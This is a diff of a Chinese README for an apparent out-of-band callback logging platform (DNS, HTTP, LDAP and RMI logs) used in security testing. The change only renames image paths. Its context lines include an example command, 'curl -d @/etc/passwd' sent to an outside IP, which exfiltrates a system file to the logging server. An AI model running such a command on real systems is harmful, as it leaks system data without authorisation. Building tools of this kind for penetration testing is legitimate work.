@@ -36,15 +36,15 @@
 
 1. 配置域名解析处右上角三个点，点击Host Names
 
-![image-20220717175903352](Readme_resource/image-20220717175903352.png)
+![image-20220717175903352](readme_resource/image-20220717175903352.png)
 
 2. 修改或新增主机名如下图所示，ip地址填写你的vps地址即可
 
-![image-20220717180002176](Readme_resource/image-20220717180002176.png)
+![image-20220717180002176](readme_resource/image-20220717180002176.png)
 
 3. 回到dns管理，将域名服务器修改为`ns1.example.com`和`ns2.example.com`
 
-![image-20220717180242944](Readme_resource/image-20220717180242944.png)
+![image-20220717180242944](readme_resource/image-20220717180242944.png)
 
 ### 安装部署
 
@@ -107,7 +107,7 @@ chmod +x start_webserver
 ./start_webserver
 ```
 
-![image-20220730035846090](Readme_resource/image-20220730035846090.png)
+![image-20220730035846090](readme_resource/image-20220730035846090.png)
 
 
 
@@ -118,7 +118,7 @@ chmod +x start_logserver
 ./start_logserver
 ```
 
-![image-20220730160132103](Readme_resource/image-20220730160132103.png)
+![image-20220730160132103](readme_resource/image-20220730160132103.png)
 
 
 
@@ -183,43 +183,43 @@ curl -d @/etc/passwd 1.1.1.1/qrq/postdata
 
 ### 登录
 
-![image-20220730151326711](Readme_resource/image-20220730151326711.png)
+![image-20220730151326711](readme_resource/image-20220730151326711.png)
 
 
 
 ### 首页
 
-![image-20220730151454295](Readme_resource/image-20220730151454295.png)
+![image-20220730151454295](readme_resource/image-20220730151454295.png)
 
 
 
 ### Dnslog
 
-![image-20220730151604227](Readme_resource/image-20220730151604227.png)
+![image-20220730151604227](readme_resource/image-20220730151604227.png)
 
 
 
 ### Httplog
 
-![image-20220730151741311](Readme_resource/image-20220730151741311.png)
+![image-20220730151741311](readme_resource/image-20220730151741311.png)
 
 
 
 ### Ldaplog
 
-![image-20220730151826344](Readme_resource/image-20220730151826344.png)
+![image-20220730151826344](readme_resource/image-20220730151826344.png)
 
 
 
 ### Rmilog
 
-![image-20220730151921478](Readme_resource/image-20220730151921478.png)
+![image-20220730151921478](readme_resource/image-20220730151921478.png)
 
 
 
 ### 账号信息
 
-![image-20220730152019445](Readme_resource/image-20220730152019445.png)
+![image-20220730152019445](readme_resource/image-20220730152019445.png)
 
 ## 🎯 ==TODO==
 
@@ -246,4 +246,4 @@ curl -d @/etc/passwd 1.1.1.1/qrq/postdata
 
 给他买杯咖啡，让他接着码！
 
-<img src="Readme_resource/wx.jpg" alt="IMG_4788" width="300px" />
+<img src="readme_resource/wx.jpg" alt="IMG_4788" width="300px" />
